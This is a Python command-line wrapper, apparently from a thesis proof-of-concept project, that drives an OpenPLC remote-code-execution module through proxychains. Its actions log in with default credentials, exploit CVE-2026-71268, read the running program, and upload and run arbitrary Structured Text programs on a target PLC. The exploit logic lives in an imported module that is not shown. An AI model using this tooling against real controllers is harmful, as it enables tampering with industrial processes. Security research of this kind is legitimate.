#!/usr/bin/env python3
"""CLI del módulo OpenPLC; se lanza como subproceso para pasar por proxychains."""

import argparse
import os
import sys

_BASE = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _BASE not in sys.path:
    sys.path.insert(0, _BASE)

from modules import openplc_rce  # noqa: E402


def _sink(line):
    print(line, flush=True)


def main():
    p = argparse.ArgumentParser(prog="openplc_cli")
    p.add_argument("action", choices=["default_login", "cve_2026_71268",
                                        "get_current_program", "upload_run"])
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--user", default="openplc")
    p.add_argument("--password", default="openplc")
    p.add_argument("--st-file", default=None)
    p.add_argument("--prog-name", default="CVE-2026-71268-PoC")
    p.add_argument("--prog-descr", default="PoC TFM")
    args = p.parse_args()

    if args.action == "default_login":
        openplc_rce._do_default_login(
            args.target, args.port, args.user, args.password, sink=_sink)
    elif args.action == "cve_2026_71268":
        openplc_rce._do_cve_2026_71268(
            args.target, args.port, args.user, args.password,
            args.st_file, args.prog_name, args.prog_descr, sink=_sink)
    elif args.action == "get_current_program":
        openplc_rce._do_get_current_program(
            args.target, args.port, args.user, args.password, sink=_sink)
    elif args.action == "upload_run":
        openplc_rce._do_upload_run(
            args.target, args.port, args.user, args.password,
            args.st_file, args.prog_name, args.prog_descr, sink=_sink)


if __name__ == "__main__":
    main()
